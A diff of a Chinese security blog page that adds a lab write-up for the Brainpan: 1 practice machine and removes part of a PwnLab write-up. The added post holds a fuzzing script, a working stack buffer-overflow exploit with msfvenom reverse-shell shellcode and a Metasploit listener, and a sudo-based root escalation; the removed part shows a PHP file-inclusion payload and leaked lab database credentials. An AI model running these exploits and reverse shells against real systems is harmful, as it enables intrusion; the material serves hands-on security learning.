@@ -255,6 +255,163 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
+    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/11/06/Brainpan-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="十三">
+      <meta itemprop="description" content="潜心学习，不骄不躁">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="十三の博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/11/06/Brainpan-1/" class="post-title-link" itemprop="url">Brainpan: 1</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-11-06 19:33:38 / 修改时间：19:35:14" itemprop="dateCreated datePublished" datetime="2022-11-06T19:33:38+08:00">2022-11-06</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/bachang/" itemprop="url" rel="index"><span itemprop="name">-bachang</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Brainpan-1"><a href="#Brainpan-1" class="headerlink" title="Brainpan: 1"></a>Brainpan: 1</h1><p>本次靶场涉及到缓冲区溢出，我就当学习这个东西了，缓冲区溢出看看攻略。</p>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>首先还是找到靶场的位置为第一步</p>
+<p><code>nmap 192.168.100.0/24 -n -sP -sn</code></p>
+<p><img src="/2022/11/06/Brainpan-1/image-20221106131316606.png" alt="image-20221106131316606"></p>
+<p>拿到对面ip地址为<code>192.168.100.171</code></p>
+<p>进行端口扫描</p>
+<p><code>nmap -A 192.168.100.171</code></p>
+<p><img src="/2022/11/06/Brainpan-1/image-20221106131541462.png" alt="image-20221106131541462"></p>
+<p>开启了9999和10000端口</p>
+<p>看到9999提示需要输入密码，我们访问10000并且扫描一下目录。</p>
+<p><code>dirb http://192.168.100.171:10000</code></p>
+<p>扫到bin目录，并且发现exe文件</p>
+<p><img src="/2022/11/06/Brainpan-1/image-20221106131844067.png" alt="image-20221106131844067"></p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>我个人的见解，在靶场中要是看到了exe文件那百分之八十都是缓冲区溢出漏洞。</p>
+<p>下载之后打开发现，这是一个开启9999端口等待连接的程序</p>
+<p><img src="/2022/11/06/Brainpan-1/image-20221106133554037.png" alt="image-20221106133554037"></p>
+<p>联想到刚才扫描到的9999端口，对面就是在9999同样开启了这么一个服务。</p>
+<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><p>一个是poc一个是exp</p>
+<p>poc：检测溢出的地方是在多少字符串</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> socket, time, sys</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;192.168.100.168&quot;</span></span><br><span class="line"></span><br><span class="line">port = <span class="number">9999</span></span><br><span class="line">timeout = <span class="number">5</span></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW1 &quot;</span></span><br><span class="line"></span><br><span class="line">string = prefix + <span class="string">&quot;A&quot;</span> * <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> s:</span><br><span class="line">      s.settimeout(timeout)</span><br><span class="line">      s.connect((ip, port))</span><br><span class="line">      s.recv(<span class="number">1024</span>)</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&quot;Fuzzing with &#123;&#125; bytes&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(string) - <span class="built_in">len</span>(prefix)))</span><br><span class="line">      s.send(<span class="built_in">bytes</span>(string, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">      s.recv(<span class="number">1024</span>)</span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Fuzzing crashed at &#123;&#125; bytes&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(string) - <span class="built_in">len</span>(prefix)))</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line">  string += <span class="number">100</span> * <span class="string">&quot;A&quot;</span></span><br><span class="line">  time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p>exp:向服务发出缓冲区溢出攻击</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#这里主要是为了定位EIP的内存地址</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;192.168.100.168&quot;</span></span><br><span class="line">port = <span class="number">9999</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW1 &quot;</span></span><br><span class="line">offset = <span class="number">0</span></span><br><span class="line">overflow = <span class="string">&quot;A&quot;</span> * offset</span><br><span class="line">retn = <span class="string">&quot;&quot;</span></span><br><span class="line">padding = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">  s.connect((ip, port))</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">  s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/clark3256453/article/details/121422527">(120条消息) Immunity Debugger中安装mona_唐风的风的博客-CSDN博客</a></p>
+<p>我这里由于本机环境问题，我就给安装到虚拟机上面了。</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="fuzzing"><a href="#fuzzing" class="headerlink" title="fuzzing"></a>fuzzing</h3><p>首先在虚拟机上打开我们下载好的exe</p>
+<p>首先使用poc检测是否存在缓冲区溢出漏洞</p>
+<p><img src="/2022/11/06/Brainpan-1/image-20221106151706491.png" alt="image-20221106151706491"></p>
+<p>发现在发送到600字节的时候就崩溃了，说明存在缓冲区溢出漏洞。</p>
+<h3 id="计算EIP位置"><a href="#计算EIP位置" class="headerlink" title="计算EIP位置"></a>计算EIP位置</h3><p>此时我们生成一段不重复字节，我们在这里选择600个字节，执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/11/06/Brainpan-1/image-20221106152001387.png" alt="image-20221106152001387"></p>
+<p>复制这串字符，放到我们的exp中</p>
+<p><img src="/2022/11/06/Brainpan-1/image-20221106152057720.png" alt="image-20221106152057720"></p>
+<p>现在把exe放在immunity debugger中运行，观察其中EIP的值为</p>
+<p>72413172</p>
+<p><img src="/2022/11/06/Brainpan-1/image-20221106153446651.png" alt="image-20221106153446651"></p>
+<p>计算一下偏移量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 72413172</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/11/06/Brainpan-1/image-20221106153510541.png" alt="image-20221106153510541"></p>
+<p>偏移量为514</p>
+<h3 id="查找坏字节"><a href="#查找坏字节" class="headerlink" title="查找坏字节"></a>查找坏字节</h3><p>我们在Immunity Debugger中输入：<code>!mona bytearray -b &quot;\x00&quot;</code></p>
+<p>0x00在C/C++语言中表示终止，所以是一个很普遍的坏字节，在上面我们首先把它排除掉。 我们用下面的bytearray.py脚本生成所有字节码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for x in range(1, 256):</span><br><span class="line">  print(&quot;\\x&quot; + &quot;&#123;:02x&#125;&quot;.format(x), end=&#x27;&#x27;)</span><br><span class="line">print()</span><br></pre></td></tr></table></figure>
+
+<p>执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root kali)-[~/tryhackme/Brainpan]</span><br><span class="line">└─# python3 bytearray.py                 </span><br><span class="line">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b \x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><br></pre></td></tr></table></figure>
+
+<p>此时我们准备第二个攻击脚本exploit2.py，把上面生成的字节码粘贴到payload变量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line">#这里主要是为了定位EIP的内存地址</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">ip = &quot;127.0.0.1&quot;</span><br><span class="line">port = 9999</span><br><span class="line"></span><br><span class="line">prefix = &quot;OVERFLOW1 &quot;</span><br><span class="line">offset = 514</span><br><span class="line">overflow = &quot;A&quot; * offset</span><br><span class="line">retn = &quot;BBBB&quot;</span><br><span class="line">padding = &quot;&quot;</span><br><span class="line">payload = &quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b \x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span><br><span class="line">postfix = &quot;&quot;</span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">  s.connect((ip, port))</span><br><span class="line">  print(&quot;Sending evil buffer...&quot;)</span><br><span class="line">  s.send(bytes(buffer + &quot;\r\n&quot;, &quot;latin-1&quot;))</span><br><span class="line">  print(&quot;Done!&quot;)</span><br><span class="line">except:</span><br><span class="line">  print(&quot;Could not connect.&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>同时，我们把偏移量514赋值到offset变量，把”BBBB”赋值到retn变量，重启brainpan.exe，执行上面的脚本</p>
+<p><img src="/2022/11/06/Brainpan-1/image-20221106153645803.png" alt="image-20221106153645803"></p>
+<p>可以看到EIP的值，此时已经变成42424242了，42在ASCII里面就是大写的B，也就是我们的retn值已经 成功覆盖到EIP中。</p>
+<p>同时也记住这里的ESP值为005FF921（又走了一位）</p>
+<p>我们执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona compare -f C:\mona\brainpan\bytearray.bin -a 0028F930</span><br></pre></td></tr></table></figure>
+
+<p>除了执行上面那个命令，我们也可以通过查看</p>
+<p><img src="/2022/11/06/Brainpan-1/image-20221106185820388.png" alt="image-20221106185820388"></p>
+<p>跟进去查看有没有无法显示的字节</p>
+<p>但是博主说这里面没有怀字节，因为我没找到这个bin文件，不过，0x00在C/C++语言中表示终止，所以是一个很普遍的坏字节，因此在这种情况下，我们可以认为唯一的坏字节是：<code>\x00</code></p>
+<h3 id="找到可以利用的ESP地址"><a href="#找到可以利用的ESP地址" class="headerlink" title="找到可以利用的ESP地址"></a>找到可以利用的ESP地址</h3><p><code>!mona jmp -r esp -cpb &quot;\x00&quot;</code>和<code>ctrl+f jmp esp</code>都可以找到这个地址</p>
+<p>311712F3</p>
+<p>需要注意的是这个地址需要从后面往回写，即:<code>\xf3\x12\x17\x31</code></p>
+<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>然后直接使用msf生成一个反弹的shellcode</p>
+<p><code>msfvenom -p linux/x86/shell_reverse_tcp -b &quot;\x00&quot; LHOST=192.168.100.129 LPORT=4444 -f python</code></p>
+<p>放到下面的exp中</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;192.168.100.171&quot;</span></span><br><span class="line">port = <span class="number">9999</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW1 &quot;</span></span><br><span class="line">offset = <span class="number">514</span>   <span class="comment">#偏移地址</span></span><br><span class="line">overflow = <span class="string">&quot;A&quot;</span> * offset</span><br><span class="line">retn = <span class="string">&quot;\xf3\x12\x17\x31&quot;</span>  <span class="comment">#上面找到的esp地址</span></span><br><span class="line"></span><br><span class="line">padding = <span class="string">&quot;\x90&quot;</span> * <span class="number">50</span>  <span class="comment">#我这里理解为防止shell在前面没执行到，先填充一点？</span></span><br><span class="line"></span><br><span class="line">buf =  <span class="string">&quot;&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xd9\xee\xbf\x4b\xc4\x96\xdd\xd9\x74\x24\xf4\x58\x31&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xc9\xb1\x12\x31\x78\x17\x83\xc0\x04\x03\x33\xd7\x74&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x28\xf2\x0c\x8f\x30\xa7\xf1\x23\xdd\x45\x7f\x22\x91&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x2f\xb2\x25\x41\xf6\xfc\x19\xab\x88\xb4\x1c\xca\xe0&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x86\x77\x48\x71\x6e\x8a\x91\x60\x33\x03\x70\x32\xad&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x43\x22\x61\x81\x67\x4d\x64\x28\xe7\x1f\x0e\xdd\xc7&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xec\xa6\x49\x37\x3c\x54\xe3\xce\xa1\xca\xa0\x59\xc4&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x5a\x4d\x97\x87&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = buf</span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">  s.connect((ip, port))</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">  s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>msf监听</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x86/shell_reverse_tcp</span><br><span class="line">set lport 443</span><br><span class="line">set lhost 192.168.2.157</span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure>
+
+<p>就可以看到弹回一个会话了</p>
+<p><img src="/2022/11/06/Brainpan-1/image-20221106190010146.png" alt="image-20221106190010146"></p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p><img src="/2022/11/06/Brainpan-1/image-20221106191721538.png" alt="image-20221106191721538"></p>
+<p>没有密码的root权限，那我们就</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /home/anansi/bin/anansi_util</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/11/06/Brainpan-1/image-20221106191759405.png" alt="image-20221106191759405"></p>
+<p>第三个参数可以执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">扩展</span><br><span class="line">shell中#一般表示注释的意思，所以很多时候认为#!也是注释，但实际上不是，和c语言中头文件一样是声明文件的路径。</span><br><span class="line"></span><br><span class="line">#! /bin/sh 是指此脚本使用/bin/sh 来执行</span><br><span class="line"></span><br><span class="line">#!是特殊的表示符，其后面跟的是解释此脚本的shell的路径，如果没有声明，则脚本将在默认的shell中执行，默认shell是由用户所在的系统定义为执行shell脚本。</span><br></pre></td></tr></table></figure>
+
+<p>所以我们可以在执行此脚本的时候，中间插一个<code>!/bin/sh</code></p>
+<p>这时候就会返回一个root权限的会话了</p>
+<p><img src="/2022/11/06/Brainpan-1/image-20221106192529634.png" alt="image-20221106192529634"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>提权技巧需要专门开一篇来进行总结，缓冲区溢出第一次接触，耗费时间有点久，不过好在是理解了其中的原理。感觉也挺简单，下次碰到可以自己做了。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
     <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/11/06/%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E7%88%86%E7%A0%B4/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -488,153 +645,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
-    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/11/02/PwnLab/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="十三">
-      <meta itemprop="description" content="潜心学习，不骄不躁">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="十三の博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/11/02/PwnLab/" class="post-title-link" itemprop="url">PwnLab</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-11-02 18:26:58 / 修改时间：18:28:50" itemprop="dateCreated datePublished" datetime="2022-11-02T18:26:58+08:00">2022-11-02</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/bachang/" itemprop="url" rel="index"><span itemprop="name">-bachang</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="PwnLab"><a href="#PwnLab" class="headerlink" title="PwnLab"></a>PwnLab</h1><p>今天最后一个靶场，ヾ(◍°∇°◍)ﾉﾞ</p>
-<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>首先是拿到对面主机的ip地址</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.100.0/24 -n -sP -sn</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/11/02/PwnLab/image-20221102154203603.png" alt="image-20221102154203603"></p>
-<p><code>192.168.100.169</code></p>
-<p>扫端口</p>
-<p><code>nmap -A 192.168.100.169</code></p>
-<p><img src="/2022/11/02/PwnLab/image-20221102154334254.png" alt="image-20221102154334254"></p>
-<p>80,111,3306,</p>
-<p>扫目录</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.100.169/</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/11/02/PwnLab/image-20221102154515475.png" alt="image-20221102154515475"></p>
-<p>扫指纹</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb http://192.168.100.169/</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/11/02/PwnLab/image-20221102154533302.png" alt="image-20221102154533302"></p>
-<h1 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h1><p>没有cms，没有注释，扫目录没扫到，没有注入（至少我没有测试出来）。</p>
-<p>那就只有把目光投向唯一的url了，随便加了个单引号发现图片挂了，sql测试了无报错，随后想到了是文件包含漏洞。</p>
-<p>百度了一个payload<code>http://192.168.100.169/?page=php://filter/read=convert.base64-encode/resource=index</code>利用伪协议读取文件</p>
-<p>最后通过阅读index追溯到-login-config</p>
-<p><img src="/2022/11/02/PwnLab/image-20221102155803535.png" alt="image-20221102155803535"></p>
-<p><img src="/2022/11/02/PwnLab/image-20221102155757889.png" alt="image-20221102155757889"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root</span><br><span class="line">H4u%QJ_H99</span><br><span class="line">Users</span><br></pre></td></tr></table></figure>
-
-<p>不得不怀疑是mysql的那个东西</p>
-<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>这里我们尝试使用伪协议写入一句话木马</p>
-<p>失败</p>
-<p><img src="/2022/11/02/PwnLab/image-20221102160903531.png" alt="image-20221102160903531"></p>
